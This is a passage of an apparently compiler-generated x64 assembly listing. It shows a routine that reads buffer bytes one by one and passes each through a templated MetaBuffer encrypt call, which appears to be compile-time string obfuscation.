  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	b8 01 00 00 00	 mov	 eax, 1
  0066f	48 6b c0 26	 imul	 rax, rax, 38		; 00000026H
  00673	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0067a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0067e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00685	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0068a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00691	88 41 27	 mov	 BYTE PTR [rcx+39], al
  00694	b8 01 00 00 00	 mov	 eax, 1
  00699	48 6b c0 27	 imul	 rax, rax, 39		; 00000027H
  0069d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006a4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006af	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  006b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006bb	88 41 28	 mov	 BYTE PTR [rcx+40], al
  006be	b8 01 00 00 00	 mov	 eax, 1
  006c3	48 6b c0 28	 imul	 rax, rax, 40		; 00000028H
  006c7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006ce	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006d9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  006de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006e5	88 41 29	 mov	 BYTE PTR [rcx+41], al
  006e8	b8 01 00 00 00	 mov	 eax, 1
  006ed	48 6b c0 29	 imul	 rax, rax, 41		; 00000029H
  006f1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006f8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00703	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00708	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0070f	88 41 2a	 mov	 BYTE PTR [rcx+42], al
  00712	b8 01 00 00 00	 mov	 eax, 1
  00717	48 6b c0 2a	 imul	 rax, rax, 42		; 0000002aH
  0071b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00722	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00726	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0072d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00732	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00739	88 41 2b	 mov	 BYTE PTR [rcx+43], al
  0073c	b8 01 00 00 00	 mov	 eax, 1
  00741	48 6b c0 2b	 imul	 rax, rax, 43		; 0000002bH
  00745	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0074c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00750	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
